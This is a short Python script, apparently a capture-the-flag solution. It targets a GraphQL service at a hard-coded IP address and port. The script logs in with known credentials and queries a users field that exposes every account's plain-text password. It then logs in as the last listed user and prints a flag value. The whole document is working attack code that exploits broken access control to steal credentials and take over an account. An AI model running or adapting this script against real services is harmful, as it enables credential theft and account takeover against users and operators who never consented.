import requests

URL = "http://3.0.56.222:50001/graphql"
known_user = "johndoe"
known_password = "complexpassword"

token_req = {
    "variables":{"uname": known_user, "pass": known_password},
    "query": """mutation Login($uname: String!, $pass: String!){
        login(username: $uname, password: $pass) {
            token
        }
    }"""
}
r = requests.post(URL, json=token_req)
token = r.json()["data"]["login"]["token"]
cookie = dict(auth=token)
user_req = {
    "operationName":None,
    "variables":{},
    "query": """{
        users {
            id
            username
            password
        }
    }"""
}
r = requests.post(URL, cookies=cookie, json=user_req)

user_data = r.json()
secret = user_data["data"]["users"][-1]
user, password = secret["username"], secret["password"]

s_token_req = {
    "operationName":None,
    "variables":{"uname": user, "pass": password},
    "query": """mutation Login($uname: String!, $pass: String!){
        login(username: $uname, password: $pass) {
            token
        }
    }"""
}
r = requests.post(URL, json=s_token_req)
secret_token = r.json()["data"]["login"]["token"]
cookie = dict(auth=secret_token)
flag_req = {
    "operationName":None,
    "variables":{},
    "query": """{
        flag {
            value
        }
    }"""
}
r = requests.post(URL, cookies=cookie, json=flag_req)
print(r.json()["data"]["flag"]["value"])
